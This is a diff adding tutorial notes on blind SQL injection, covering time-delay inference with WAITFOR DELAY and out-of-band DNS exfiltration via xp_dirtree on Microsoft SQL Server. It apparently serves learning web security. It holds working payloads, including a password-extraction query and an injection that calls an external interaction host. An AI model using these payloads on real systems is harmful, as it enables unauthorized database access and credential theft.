@@ -481,5 +481,54 @@ ERROR: invalid input syntax for type integer: "Example data"
 
 ### Exploiting blind SQL injection by triggering time delay :
 
+* In some of the preceding examples, we've seen how you can exploit the way application fail to properly handel database errors. But what if the application catches these errors and handles them gracefully? 
+* Triggering a database error when the injected SQL quey is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional error will not work.
 
+* In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. 
+* Because SQL queries are generally processed synchronously by the application, delaying the execution of a SQL query will also delay the HTTP responses. 
+* This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.
+
+* The technique for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:
+
+```sql
+'; IF (1=2) WAITFOR DELAY '0:0:10' --
+'; IF (1=1) WAITFOR DELAY '0:0:10' --
+```
+* The first these input will not trigger a delay, because the condition `1=2` is false.
+* The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.
+
+* Using this technique, we can retrieve data in the way already described, by systematically testing on character at a time.
+
+```sql
+' ; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1)> 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+* Note : There are various ways to trigger time delay within SQL queries, and different techniques apply on different types of database.
+    * Resource : [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+## Exploiting blind SQL injeciton using out-of-band (OAST) techniques :
+
+
+* Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and another to execute a SQL query using the tracking cookie.
+* The query is still vulnerable to SQL injection, however none fo the technique describe so far will work:
+* The application's response doesn't depend on whether the query return any data, or on whether a database error occurs, or the time taken to execute the query.
+* In This situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-out-of band network interactions to a system that you control. 
+* As previously, these can be trigger conditionally, depending on an injection condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.
+
+* A variety of network protocol can be used for this purpose, but typically the most effective is DNS(Domain name service). This is because very many production network allow free egress of DNS queries, because they are essential for the normal operation of production system.
+
+* There are multiple ways to perform :
+    * Burp Collaborator
+    * [interactsh](https://app.interactsh.com/)
+
+* The technique for triggering a DNS query and highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specific domain:
+
+```sql
+' ; exec master..xp_dirtree '//cjjqp6g2vtc00009zmr0gjjm5dcyyyyyb.oast.fun/a' --
+```
+
+* This will cause the database to perform lookup for the following lookup domain:
+
+```url
+cjjqp6g2vtc00009zmr0gjjm5dcyyyyyb.oast.fun
+```
 
